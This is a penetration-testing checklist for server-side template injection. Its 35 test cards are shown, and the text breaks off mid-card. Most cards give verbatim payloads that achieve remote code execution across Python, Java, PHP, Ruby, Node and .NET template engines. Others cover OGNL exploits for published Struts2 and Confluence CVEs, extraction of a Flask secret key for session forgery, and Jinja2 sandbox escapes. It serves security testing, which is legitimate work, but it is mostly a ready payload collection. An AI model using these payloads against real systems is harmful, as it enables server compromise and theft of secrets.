# SSTI — Checklist

Expert per-attack **test-case matrix** for SSTI — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*41 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## SSTI-001 — Map template-rendered sinks
**Test Category:** Recon &amp; Surface Mapping · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Template Engine:** Any

**Where to Test / Injection Point:** Templates, email/PDF/report generators, reflected fields, 'customize template' features

**Test Steps:** 1. Find every place user input is rendered by a SERVER-SIDE template (page fields, email/PDF/report bodies, error pages).<br>2. Flag high-yield features: 'customize template', page-builder, invoice/report templates, notification templates.<br>3. Note reflected values that survive into rendered output.

**Expected Result:** A catalogue of server-template sinks that may evaluate user input.

**Payload Example:**

```
profile name, email subject/body templates, invoice template editor, ?name= reflected in a rendered page
```

**Impact:** Defines the SSTI attack surface; template-editor features are the highest-yield sinks.

**Tools:** Burp Suite Pro, manual

**References:** CWE-1336; CWE-94; PortSwigger Web Security Academy: Server-side template injection

---

## SSTI-002 — Grep source for template-render-with-user-input
**Test Category:** Recon &amp; Surface Mapping · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Template Engine:** Any

**Where to Test / Injection Point:** Gray-box: source / JS

**Test Steps:** 1. Search for dynamic render of user input: render_template_string, Template().render, Handlebars.compile, ERB.new, Twig createTemplate, Blade::render, new Function.<br>2. Distinguish rendering a fixed template WITH data (safe) from rendering a user-controlled template string (vulnerable).<br>3. Map hits to endpoints.

**Expected Result:** Code paths that compile/evaluate a user-controlled template string are identified.

**Payload Example:**

```
grep -rEn "render_template_string|Template\(.+render|Handlebars.compile|ERB.new|Blade::render" .
```

**Impact:** Pinpoints true SSTI sinks and proves root cause for the report.

**Tools:** ripgrep, Semgrep

**References:** CWE-1336; CWE-94; PortSwigger Web Security Academy: Server-side template injection

---

## SSTI-003 — Fingerprint stack &amp; stand up OOB
**Test Category:** Recon &amp; Surface Mapping · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Template Engine:** Any

**Where to Test / Injection Point:** Server headers, error pages; OOB listener

**Test Steps:** 1. Infer language from Server header/errors (Python/Java/PHP/Ruby/Node/.NET).<br>2. Note whether the app reflects ${}/%{}/#{} (Java expression languages) vs {{}} (Jinja/Twig).<br>3. Stand up a Collaborator/interactsh host for blind cases.

**Expected Result:** The likely language/engine family and a ready OOB channel.

**Payload Example:**

```
Server: Werkzeug -> Python/Jinja2 ; Server: Apache-Coyote -> Java ; X-Powered-By: Express -> Node
```

**Impact:** Narrows the engine set and enables blind confirmation.

**Tools:** Burp Collaborator, interactsh, whatweb

**References:** CWE-1336; CWE-94; PortSwigger Web Security Academy: Server-side template injection

---

## SSTI-004 — Differential detection — confirm SERVER-SIDE evaluation
**Test Category:** Detection — Differential · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

**Template Engine:** Any (Jinja/Twig/numeric)

**Where to Test / Injection Point:** Any reflected sink

**Test Steps:** 1. Send NON-round operands the page can't already contain: {{1337*1338}} -&gt; 1788906.<br>2. String-multiply differentiator: {{7*'7'}} -&gt; 7777777 (Jinja2/Python string-repeat) vs 49 (Twig/Smarty/PHP numeric coercion) vs error - this probe SEPARATES Jinja2 from Twig.<br>3. Verify the SERVER response computed it (before any JS) and the literal {{...}} is gone.

**Expected Result:** The server response contains 1788906 / 7777777 and the raw {{...}} is absent - proving server-side eval.

**Payload Example:**

```
{{1337*1338}}   -> 1788906
{{7*'7'}}       -> 7777777
```

**Impact:** The make-or-break step; separates real SSTI from reflection/coincidence.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; PortSwigger Web Security Academy: Server-side template injection; PayloadsAllTheThings/Server Side Template Injection

---

## SSTI-005 — Multi-engine polyglot &amp; rule out CSTI
**Test Category:** Detection — Differential · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

**Template Engine:** Multiple

**Where to Test / Injection Point:** Reflected sink; unknown engine

**Test Steps:** 1. Send the polyglot ${{&lt;%[%'"}}%\ to trigger errors across engines.<br>2. Try per-syntax numeric probes: ${1337*1338} (Freemarker/SpEL), #{1337*1338} (Ruby/Thymeleaf), &lt;%= 1337*1338 %&gt; (ERB/EJS), {1337*1338} (Smarty).<br>3. RULE OUT CSTI: if raw {{}} reaches the browser and JS computes it (Angular/Vue), that's CSTI -&gt; XSS kit, not SSTI.

**Expected Result:** One syntax computes server-side; browser-only evaluation is excluded.

**Payload Example:**

```
${{<%[%'"}}%\
${1337*1338}   #{1337*1338}   <%= 1337*1338 %>   {1337*1338}
```

**Impact:** Identifies the syntax family and prevents mis-filing CSTI as SSTI.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; PortSwigger Web Security Academy: Server-side template injection

---

## SSTI-006 — Engine fingerprint decision tree
**Test Category:** Fingerprint · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Template Engine:** Multiple

**Where to Test / Injection Point:** Confirmed server-side eval

**Test Steps:** 1. {{7*7}}=49 &amp; {{7*'7'}}=7777777 &amp; {{config}} renders -&gt; Jinja2. Twig filters/_self work -&gt; Twig.<br>2. ${7*7}=49 &amp; ?new() works -&gt; Freemarker; T(java.lang.Runtime) works -&gt; SpEL/Thymeleaf.<br>3. &lt;%=7*7%&gt;=49 -&gt; ERB/EJS; {7*7}=49 -&gt; Smarty; range.constructor works -&gt; Nunjucks.

**Expected Result:** The exact template engine is identified, selecting the RCE payload set.

**Payload Example:**

```
{{config}} (Jinja) | ${...?new()} (Freemarker) | {{range.constructor}} (Nunjucks)
```

**Impact:** Engine identity determines the entire exploitation path.

**Tools:** Burp Repeater, SSTImap, tplmap

**References:** CWE-1336; CWE-94; PortSwigger Web Security Academy: Server-side template injection; HackTricks SSTI

---

## SSTI-007 — Detect Java expression-language context (OGNL/MVEL/EL)
**Test Category:** Fingerprint · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

**Template Engine:** OGNL / MVEL / Java-EL

**Where to Test / Injection Point:** Java app reflecting ${}/%{}/#{}

**Test Steps:** 1. If a Java app evaluates ${7*7}/%{7*7}/#{7*7} to 49, it's expression-language injection (OGNL/SpEL/MVEL/Java-EL), not just a template engine.<br>2. Common in Struts/Confluence/Spring/JSF.<br>3. Match product+version to a published PoC.

**Expected Result:** ${7*7}/%{7*7}/#{7*7} returns 49 in the server response -&gt; EL injection context.

**Payload Example:**

```
${7*7}   %{7*7}   #{7*7}   -> 49
```

**Impact:** Recognising EL context unlocks the highest-impact (often unauth) RCE PoCs.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; HackTricks SSTI; PayloadsAllTheThings/Server Side Template Injection

---

## SSTI-008 — Jinja2 RCE via globals chain
**Test Category:** Impact — RCE (Python) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** Jinja2 (Flask/Python)

**Where to Test / Injection Point:** Confirmed Jinja2 sink

**Test Steps:** 1. Reach os via a global object: cycler/lipsum/joiner/get_flashed_messages.__globals__.<br>2. Run a benign marker: popen('id').read().<br>3. If one gadget is filtered, try the next.

**Expected Result:** The response contains the output of id (uid=...), proving RCE.

**Payload Example:**

```
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
```

**Impact:** Remote code execution on a Python/Flask server - Critical; lead the report with it.

**Tools:** Burp Repeater, SSTImap

**References:** CWE-1336; CWE-94; PortSwigger Web Security Academy: Server-side template injection; PayloadsAllTheThings/Server Side Template Injection

---

## SSTI-009 — Jinja2 secret disclosure / Flask session forge
**Test Category:** Impact — Secrets (Python) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Template Engine:** Jinja2 (Flask/Python)

**Where to Test / Injection Point:** Jinja2 sink where RCE gadgets are blocked

**Test Steps:** 1. If RCE is blocked, dump config: {{config}} / {{config['SECRET_KEY']}}.<br>2. Use SECRET_KEY to forge a Flask session cookie (privilege escalation / auth bypass).<br>3. Redact the key in the report.

**Expected Result:** {{config}} renders app configuration including SECRET_KEY.

**Payload Example:**

```
{{ config }}
{{ config['SECRET_KEY'] }}
```

**Impact:** Session forgery / privilege escalation even without RCE - High.

**Tools:** Burp Repeater, flask-unsign

**References:** CWE-1336; CWE-94; PortSwigger Web Security Academy: Server-side template injection

---

## SSTI-010 — Mako RCE
**Test Category:** Impact — RCE (Python) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** Mako (Python)

**Where to Test / Injection Point:** Confirmed Mako sink

**Test Steps:** 1. Mako allows Python directly: &lt;%import os%&gt;${os.popen('id').read()}.<br>2. Or via module cache: ${self.module.cache.util.os.system('id')}.<br>3. Capture one benign line.

**Expected Result:** The response contains id output.

**Payload Example:**

```
<%import os%>${os.popen('id').read()}
${self.module.cache.util.os.system('id')}
```

**Impact:** RCE on a Python/Mako server - Critical.

**Tools:** Burp Repeater, SSTImap

**References:** CWE-1336; CWE-94; PayloadsAllTheThings/Server Side Template Injection

---

## SSTI-011 — Tornado RCE
**Test Category:** Impact — RCE (Python) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** Tornado (Python)

**Where to Test / Injection Point:** Confirmed Tornado sink

**Test Steps:** 1. Import os and popen: {% import os %}{{ os.popen('id').read() }}.<br>2. Capture one benign line.

**Expected Result:** The response contains id output.

**Payload Example:**

```
{% import os %}{{ os.popen('id').read() }}
```

**Impact:** RCE on a Python/Tornado server - Critical.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; PayloadsAllTheThings/Server Side Template Injection

---

## SSTI-012 — Django template injection (sandboxed — info disclosure)
**Test Category:** Impact — Info Disclosure (Python) · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Template Engine:** Django (Python)

**Where to Test / Injection Point:** Django template sink rendering user input

**Test Steps:** 1. IMPORTANT: {{7*7}} does NOT evaluate in Django (no arithmetic) - Django templates are sandboxed, so do NOT expect RCE.<br>2. Test attribute/context traversal: {{ request }}, {{ settings.SECRET_KEY }} (if settings in context), {{ user.is_superuser }}.<br>3. Look for |safe misuse or {% debug %} exposing context -&gt; XSS / secret leak.

**Expected Result:** Context variables/attributes render (or SECRET_KEY leaks) but arithmetic/code does not execute.

**Payload Example:**

```
{{ settings.SECRET_KEY }}
{{ request.META }}
{% debug %}
```

**Impact:** Django's template sandbox blocks RCE; impact is info disclosure (SECRET_KEY -&gt; session forge) or |safe-&gt;XSS.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; PortSwigger Web Security Academy: Server-side template injection; PayloadsAllTheThings/Server Side Template Injection

---

## SSTI-013 — Freemarker RCE via Execute utility
**Test Category:** Impact — RCE (Java) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** Freemarker (Java)

**Where to Test / Injection Point:** Confirmed Freemarker sink

**Test Steps:** 1. Instantiate the Execute utility: &lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ ex("id") }.<br>2. Or one-liner ${"freemarker.template.utility.Execute"?new()("id")}.<br>3. Capture one benign line.

**Expected Result:** The response contains id output.

**Payload Example:**

```
${"freemarker.template.utility.Execute"?new()("id")}
```

**Impact:** RCE on a Java/Freemarker server - Critical.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; PortSwigger Web Security Academy: Server-side template injection; PayloadsAllTheThings/Server Side Template Injection

---

## SSTI-014 — Velocity RCE
**Test Category:** Impact — RCE (Java) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** Velocity (Java)

**Where to Test / Injection Point:** Confirmed Velocity sink

**Test Steps:** 1. Reach Runtime via class inspection: #set($r=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))$r.<br>2. Capture one benign line.

**Expected Result:** The response reflects the Runtime.exec result.

**Payload Example:**

```
#set($e="exec")#set($r=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))$r
```

**Impact:** RCE on a Java/Velocity server - Critical.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; PayloadsAllTheThings/Server Side Template Injection

---

## SSTI-015 — SpEL / Thymeleaf RCE
**Test Category:** Impact — RCE (Java) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** SpEL / Thymeleaf (Spring)

**Where to Test / Injection Point:** Spring SpEL or Thymeleaf expression sink

**Test Steps:** 1. T(java.lang.Runtime).getRuntime().exec("id").<br>2. Thymeleaf preprocessing form: __${T(java.lang.Runtime).getRuntime().exec("id")}__::.x .<br>3. Array form for args: exec(new String[]{"/bin/sh","-c","id"}).

**Expected Result:** The Runtime.exec runs; confirm via output or OOB.

**Payload Example:**

```
${T(java.lang.Runtime).getRuntime().exec("id")}
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
```

**Impact:** RCE on Spring/Thymeleaf - Critical.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; PortSwigger Web Security Academy: Server-side template injection; HackTricks SSTI

---

## SSTI-016 — Groovy template RCE
**Test Category:** Impact — RCE (Java) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** Groovy (Jenkins/Spring)

**Where to Test / Injection Point:** GroovyTemplateEngine / Jenkins script sinks

**Test Steps:** 1. ${"id".execute().text} or ${Runtime.getRuntime().exec("id").text}.<br>2. ProcessBuilder form for reliability.<br>3. In Jenkins script-security, use a version-matched sandbox-escape gadget.

**Expected Result:** The response contains id output.

**Payload Example:**

```
${"id".execute().text}
${new ProcessBuilder(["bash","-c","id"]).start().text}
```

**Impact:** RCE via Groovy template/Jenkins - Critical.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; HackTricks SSTI

---

## SSTI-017 — Pebble RCE
**Test Category:** Impact — RCE (Java) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** Pebble (Java)

**Where to Test / Injection Point:** Confirmed Pebble sink

**Test Steps:** 1. Use the published Pebble RCE chain via getClass().forName('java.lang.Runtime').<br>2. {{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}.<br>3. Capture one benign line.

**Expected Result:** The response reflects the exec result.

**Payload Example:**

```
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
```

**Impact:** RCE on Java/Pebble - Critical.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; PayloadsAllTheThings/Server Side Template Injection

---

## SSTI-018 — OGNL injection — Apache Struts2
**Test Category:** Impact — RCE (Java EL) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** OGNL (Struts2)

**Where to Test / Injection Point:** Struts2 Content-Type / param OGNL (CVE-2017-5638)

**Test Steps:** 1. Detect ${7*7}/%{7*7} -&gt; 49.<br>2. Deliver the published CVE-2017-5638 OGNL PoC via the Content-Type header.<br>3. Prove with id, then STOP.

**Expected Result:** The OGNL expression executes id via the Content-Type header.

**Payload Example:**

```
Content-Type: %{(#_='multipart/form-data')...@java.lang.Runtime@getRuntime().exec('id')...}
```

**Impact:** Unauthenticated RCE on Struts2 - Critical (mass-exploited class).

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; Struts2 CVE-2017-5638; HackTricks SSTI

---

## SSTI-019 — OGNL injection — Atlassian Confluence
**Test Category:** Impact — RCE (Java EL) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** OGNL (Confluence)

**Where to Test / Injection Point:** Confluence queryString/page params (CVE-2021-26084) or URL path (CVE-2022-26134)

**Test Steps:** 1. CVE-2021-26084: inject OGNL into a page/queryString param.<br>2. CVE-2022-26134: URL-path OGNL (unauth).<br>3. Match the exact product version to the right PoC; prove with id, then STOP.

**Expected Result:** The OGNL expression executes id on the Confluence server.

**Payload Example:**

```
'%2b#{@java.lang.Runtime@getRuntime().exec("id")}%2b'
/%24%7B...@java.lang.Runtime@getRuntime().exec(%22id%22)...%7D/
```

**Impact:** Unauthenticated RCE on Confluence - Critical.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; Confluence CVE-2021-26084, CVE-2022-26134

---

## SSTI-020 — Java EL (JSP/JSF) injection
**Test Category:** Impact — RCE (Java EL) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** Java EL (JSP/JSF)

**Where to Test / Injection Point:** JSP/JSF ${ } / #{ } expression sinks

**Test Steps:** 1. Confirm ${7*7}/#{7*7} -&gt; 49.<br>2. Reflectively reach Runtime.exec via getClass().forName('java.lang.Runtime').<br>3. Prove with id.

**Expected Result:** The EL expression executes id via reflection.

**Payload Example:**

```
${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
```

**Impact:** RCE via Java EL - Critical.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; PayloadsAllTheThings/Server Side Template Injection

---

## SSTI-021 — Twig RCE via filter/callback
**Test Category:** Impact — RCE (PHP) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** Twig (PHP)

**Where to Test / Injection Point:** Confirmed Twig sink

**Test Steps:** 1. {{ ['id']|filter('system') }} or {{ ['id','']|sort('system') }}.<br>2. Or register a callback: {{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}.<br>3. Capture one benign line.

**Expected Result:** The response contains id output.

**Payload Example:**

```
{{ ['id']|filter('system') }}
{{ attribute(_self.env,'getFilter',['system'])('id') }}
```

**Impact:** RCE on a PHP/Twig server - Critical (cf. Craft CMS Twig CVEs).

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; Craft CMS CVE-2024-56145; PortSwigger Web Security Academy: Server-side template injection

---

## SSTI-022 — Smarty RCE
**Test Category:** Impact — RCE (PHP) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** Smarty (PHP)

**Where to Test / Injection Point:** Confirmed Smarty sink

**Test Steps:** 1. {system('id')} or {php}system('id');{/php} (older).<br>2. Capture one benign line.

**Expected Result:** The response contains id output.

**Payload Example:**

```
{system('id')}
{php}system('id');{/php}
```

**Impact:** RCE on a PHP/Smarty server - Critical.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; PayloadsAllTheThings/Server Side Template Injection

---

## SSTI-023 — Blade (Laravel) RCE
**Test Category:** Impact — RCE (PHP) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** Blade (Laravel)

**Where to Test / Injection Point:** Where user Blade is compiled: Blade::render($userInput)

**Test Steps:** 1. Only exploitable if user input is compiled as Blade (look for Blade::render).<br>2. {{ system('id') }} within the rendered template.<br>3. Capture one benign line.

**Expected Result:** The response contains id output when user Blade is evaluated.

**Payload Example:**

```
{{ system('id') }}   (requires Blade::render($userInput))
```

**Impact:** RCE on Laravel where raw Blade rendering is exposed - Critical.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; HackTricks SSTI

---

## SSTI-024 — ERB / Slim RCE
**Test Category:** Impact — RCE (Ruby) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** ERB / Slim (Ruby)

**Where to Test / Injection Point:** Confirmed Ruby template sink

**Test Steps:** 1. ERB: &lt;%= `id` %&gt; / &lt;%= system('id') %&gt; / &lt;%= IO.popen('id').read %&gt;.<br>2. Slim: #{`id`}.<br>3. Capture one benign line.

**Expected Result:** The response contains id output.

**Payload Example:**

```
<%= `id` %>
<%= IO.popen('id').read %>
```

**Impact:** RCE on a Ruby/ERB server - Critical.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; PortSwigger Web Security Academy: Server-side template injection; PayloadsAllTheThings/Server Side Template Injection

---

## SSTI-025 — EJS RCE
**Test Category:** Impact — RCE (Node) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** EJS (Node.js)

**Where to Test / Injection Point:** Confirmed EJS sink

**Test Steps:** 1. Reach child_process via process.mainModule.<br>2. &lt;%= global.process.mainModule.require('child_process').execSync('id') %&gt;.<br>3. Capture one benign line.

**Expected Result:** The response contains id output.

**Payload Example:**

```
<%= global.process.mainModule.require('child_process').execSync('id') %>
```

**Impact:** RCE on a Node/EJS server - Critical.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; PayloadsAllTheThings/Server Side Template Injection

---

## SSTI-026 — Pug / Jade RCE
**Test Category:** Impact — RCE (Node) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** Pug / Jade (Node.js)

**Where to Test / Injection Point:** Confirmed Pug/Jade sink

**Test Steps:** 1. #{root.process.mainModule.require('child_process').execSync('id')}.<br>2. Or = global.process.mainModule.require('child_process').execSync('id').<br>3. Capture one benign line.

**Expected Result:** The response contains id output.

**Payload Example:**

```
#{root.process.mainModule.require('child_process').execSync('id')}
```

**Impact:** RCE on a Node/Pug server - Critical.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; PayloadsAllTheThings/Server Side Template Injection

---

## SSTI-027 — Nunjucks RCE
**Test Category:** Impact — RCE (Node) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** Nunjucks (Node.js)

**Where to Test / Injection Point:** Confirmed Nunjucks sink

**Test Steps:** 1. Use range.constructor to build a function returning process.<br>2. {{ range.constructor("return global.process.mainModule.require('child_process').execSync('id')")() }}.<br>3. Capture one benign line.

**Expected Result:** The response contains id output.

**Payload Example:**

```
{{ range.constructor("return global.process.mainModule.require('child_process').execSync('id')")() }}
```

**Impact:** RCE on a Node/Nunjucks server - Critical.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; PayloadsAllTheThings/Server Side Template Injection

---

## SSTI-028 — Handlebars RCE (prototype chain)
**Test Category:** Impact — RCE (Node) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** Handlebars (Node.js)

**Where to Test / Injection Point:** Confirmed Handlebars sink

**Test Steps:** 1. Use the multi-step prototype payload (see PayloadsAllTheThings) to reach require('child_process').execSync.<br>2. Build the chain via #with/lookup/constructor.<br>3. Capture one benign line.

**Expected Result:** The response contains id output via the Handlebars prototype chain.

**Payload Example:**

```
{{#with "s" as |string|}}...lookup string.sub "constructor"...require('child_process').execSync('id')...{{/with}}
```

**Impact:** RCE on a Node/Handlebars server - Critical.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; PayloadsAllTheThings/Server Side Template Injection

---

## SSTI-029 — doT / Eta / Marko RCE (constructor.constructor)
**Test Category:** Impact — RCE (Node) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** doT / Eta / Marko (Node.js)

**Where to Test / Injection Point:** Node engines compiling via new Function

**Test Steps:** 1. doT: {{= global.process.mainModule.require('child_process').execSync('id') }}.<br>2. Eta/Marko: it.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').<br>3. Capture one benign line.

**Expected Result:** The response contains id output.

**Payload Example:**

```
{{= global.process.mainModule.require('child_process').execSync('id') }}
<%= it.constructor.constructor('return process')()... execSync('id') %>
```

**Impact:** RCE on Node engines that compile via new Function - Critical.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; PayloadsAllTheThings/Server Side Template Injection

---

## SSTI-030 — Squirrelly helper/option-injection RCE
**Test Category:** Impact — RCE (Node) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** Squirrelly (Node.js)

**Where to Test / Injection Point:** Squirrelly with user-controlled helper/option config

**Test Steps:** 1. Abuse autoEscape/helper/option config injection (CVE-class, like EJS option-injection).<br>2. Reach child_process via the injected helper.<br>3. Prove with id.

**Expected Result:** A crafted helper/option config executes id.

**Payload Example:**

```
abuse autoEscape/helper config -> require('child_process').execSync('id')
```

**Impact:** RCE on Node/Squirrelly - Critical.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; PayloadsAllTheThings/Server Side Template Injection

---

## SSTI-031 — Razor (.NET) RCE
**Test Category:** Impact — RCE (.NET) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** Razor (.NET)

**Where to Test / Injection Point:** Where user Razor is compiled server-side

**Test Steps:** 1. Only exploitable if user input is compiled as Razor.<br>2. @{ System.Diagnostics.Process.Start("cmd.exe","/c id"); }.<br>3. Prove with a benign command.

**Expected Result:** The compiled Razor executes the OS command.

**Payload Example:**

```
@{ System.Diagnostics.Process.Start("cmd.exe","/c whoami"); }
```

**Impact:** RCE on .NET where raw Razor compilation is exposed - Critical.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; PayloadsAllTheThings/Server Side Template Injection

---

## SSTI-032 — Go text/template — info disclosure
**Test Category:** Impact — Info Disclosure · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Template Engine:** Go text/template

**Where to Test / Injection Point:** Go template reflecting user input

**Test Steps:** 1. {{.}} reflects the current context; {{printf "%s" .Secret}} may leak fields.<br>2. html/template auto-escapes (XSS-safe); text/template does not.<br>3. Focus on data/secret disclosure - RCE is not generally available.

**Expected Result:** Template context fields (secrets) are disclosed via reflection.

**Payload Example:**

```
{{.}}
{{printf "%s" .Secret}}
```

**Impact:** Sensitive-data disclosure (not RCE) on Go templates - Medium/High by data.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; HackTricks SSTI

---

## SSTI-033 — Logic-less engines — data disclosure / HTML injection only
**Test Category:** Impact — Info Disclosure · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

**Template Engine:** Hogan / Mustache / Dust

**Where to Test / Injection Point:** Logic-less template sinks

**Test Steps:** 1. Hogan/Mustache/Dust are logic-less -&gt; generally NO RCE.<br>2. Test for context/data disclosure and HTML injection (XSS) instead.<br>3. Do NOT over-claim RCE.

**Expected Result:** Data/context leakage or HTML injection - not code execution.

**Payload Example:**

```
{{context_variable}}  (data disclosure)  |  HTML injection -> file as XSS
```

**Impact:** Prevents over-claiming; correctly scopes logic-less engines to disclosure/XSS.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; HackTricks SSTI

---

## SSTI-034 — Jinja2 sandbox escape (config/__class__ blocked)
**Test Category:** Bypass — Sandbox · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** Jinja2 (Flask/Python)

**Where to Test / Injection Point:** Jinja2 where {{config}}/__class__ are blocked

**Test Steps:** 1. Reach globals via alternate objects: cycler/joiner/namespace/request.application.__globals__.<br>2. Attribute access via |attr('__class__') or ['__class__'].<br>3. Then the standard os.popen chain.

**Expected Result:** A blocked-gadget Jinja2 sandbox is escaped and RCE/secret access restored.

**Payload Example:**

```
{{ namespace.__init__.__globals__.os.popen('id').read() }}
{{ ''|attr('__class__') }}
```

**Impact:** Restores RCE against partially-hardened Jinja2 sandboxes.

**Tools:** Burp Repeater

**References:** CWE-1336; CWE-94; PortSwigger Web Security Academy: Server-side template injection; PayloadsAllTheThings/Server Side Template Injection

---

## SSTI-035 — Jinja2 filter/WAF bypass (blocked { . _ keywords)
**Test Category:** Bypass — WAF/Filter · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Template Engine:** Jinja2 (Flask/Python)

**Where to Test / Injection Point:** Jinja2 behind a keyword/char filter

